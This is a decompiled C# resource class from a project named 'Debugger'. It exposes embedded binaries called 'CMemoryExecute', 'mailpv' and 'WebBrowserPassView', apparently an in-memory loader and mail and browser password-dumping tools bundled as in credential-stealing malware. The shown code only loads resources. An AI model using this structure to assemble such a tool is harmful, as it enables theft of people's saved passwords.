namespace Debugger.My.Resources
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.CodeDom.Compiler;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Globalization;
    using System.Resources;
    using System.Runtime.CompilerServices;

    [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"), HideModuleName, DebuggerNonUserCode, StandardModule, CompilerGenerated]
    internal sealed class Resources
    {
        private static CultureInfo resourceCulture;
        private static System.Resources.ResourceManager resourceMan;

        internal static byte[] CMemoryExecute
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("CMemoryExecute", resourceCulture));
            }
        }

        [EditorBrowsable(EditorBrowsableState.Advanced)]
        internal static CultureInfo Culture
        {
            get
            {
                return resourceCulture;
            }
            set
            {
                resourceCulture = value;
            }
        }

        internal static byte[] mailpv
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("mailpv", resourceCulture));
            }
        }

        [EditorBrowsable(EditorBrowsableState.Advanced)]
        internal static System.Resources.ResourceManager ResourceManager
        {
            get
            {
                if (object.ReferenceEquals(resourceMan, null))
                {
                    System.Resources.ResourceManager manager2 = new System.Resources.ResourceManager("Debugger.Resources", typeof(Debugger.My.Resources.Resources).Assembly);
                    resourceMan = manager2;
                }
                return resourceMan;
            }
        }

        internal static byte[] WebBrowserPassView
        {
            get
            {
                return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("WebBrowserPassView", resourceCulture));
            }
        }
    }
}

